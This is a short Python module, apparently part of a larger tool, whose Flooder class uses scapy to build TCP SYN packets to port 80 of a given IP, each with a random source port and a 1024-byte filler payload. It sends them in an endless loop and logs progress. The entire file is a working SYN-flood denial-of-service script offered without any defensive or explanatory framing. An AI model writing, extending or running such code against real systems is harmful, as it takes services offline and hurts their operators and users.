import socket
from scapy.all import *
from scapy.layers.inet import IP, TCP


class Flooder:
    def __init__(self, logger):
        self.logger = logger
        self.logger.info("Flooder module initialized!")

    def tcp_syn_flood(self, ip):
        self.logger.info("Building tcp paket...")
        ippaket = IP(dst=ip)
        tcppaket = TCP(sport=RandShort(), dport=80, flags="S")
        rawmessage = Raw(b"X"*1024)
        p = ippaket / tcppaket / rawmessage
        self.logger.info("Done!")
        self.logger.info("Starting flood now!")
        i = 0
        while True:
            send(p, loop=0, verbose=0)
            i += 1
            if i >= 10:
                i = 0
                self.logger.debug("10 pakets sent!")
